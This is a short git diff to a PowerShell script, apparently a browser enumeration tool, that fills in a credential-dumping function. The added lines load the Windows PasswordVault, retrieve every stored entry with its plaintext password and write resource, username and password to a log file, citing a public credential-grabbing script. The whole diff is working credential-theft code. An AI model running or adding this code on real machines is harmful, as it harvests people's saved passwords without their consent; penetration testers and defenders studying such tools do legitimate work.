@@ -430,6 +430,12 @@ function ADDONS {
 
 function CREDS_DUMP {
     ## TODO: Retrieve IE Credentials
+    echo "`n`n[ IE ]" >> $LogFilePath\BrowserEnum.log
+    echo "`nhttps://github.com/HanseSecure/credgrap_ie_edge/blob/master/credgrap_ie_edge.ps1" >> $LogFilePath\BrowserEnum.log
+    echo "  ------------------------------------------------------" >> $LogFilePath\BrowserEnum.log
+    [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
+    $vault = New-Object Windows.Security.Credentials.PasswordVault
+    $vault.RetrieveAll() | % { $_.RetrievePassword();$_ }| select Resource, UserName, Password | Sort-Object Resource | ft -AutoSize | Out-File $LogFilePath\BrowserEnum.log -Force 
 
     ## TODO: Retrieve FireFox Credentials
     echo "`n`n[ Firefox ]" >> $LogFilePath\BrowserEnum.log
